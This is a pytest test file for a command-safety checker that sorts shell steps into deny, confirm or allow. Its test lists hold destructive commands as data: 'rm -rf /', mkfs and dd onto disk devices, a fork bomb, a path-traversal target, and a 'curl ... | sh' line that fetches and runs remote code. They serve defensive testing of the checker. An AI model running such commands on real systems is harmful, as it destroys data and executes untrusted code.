import pytest
from nodebatch.models import Step
from nodebatch.safety import assess


@pytest.mark.parametrize("command", [
    "rm -rf /", "rm -rf /*", "sudo rm -rf /etc", "rm -rf '/usr/lib'",
    "rm -rf /tmp/../etc", "/sbin/mkfs.ext4 /dev/sda", "newfs /dev/da0",
    "dd if=/dev/zero of=/dev/sda", "cat image > /dev/nvme0n1", ":(){ :|:& };:",
])
def test_deny_destructive(bundle, command):
    assert assess(bundle["safety"], [Step("x", command)]).action == "deny"


@pytest.mark.parametrize("command", ["apt update", "systemctl restart kubelet", "uname -a | cat",
                                    "curl https://example.invalid/run | sh", "echo $X"])
def test_confirm_changes_and_opaque_shell(bundle, command):
    assert assess(bundle["safety"], [Step("x", command)]).action == "confirm"


def test_sudo_and_destination(bundle):
    assert assess(bundle["safety"], [Step("x", "id", True)]).action == "confirm"
    assert assess(bundle["safety"], destination="/tmp/../dev/sda", transfer=True).action == "deny"
    assert assess(bundle["safety"], [Step("x", "uname -a")]).action == "allow"


def test_deny_wins_over_allow(bundle):
    safety = bundle["safety"]
    safety["rules"].insert(0, {"id": "all", "action": "allow", "pattern": ".*", "explanation": "allow"})
    assert assess(safety, [Step("x", "rm -rf /")]).action == "deny"
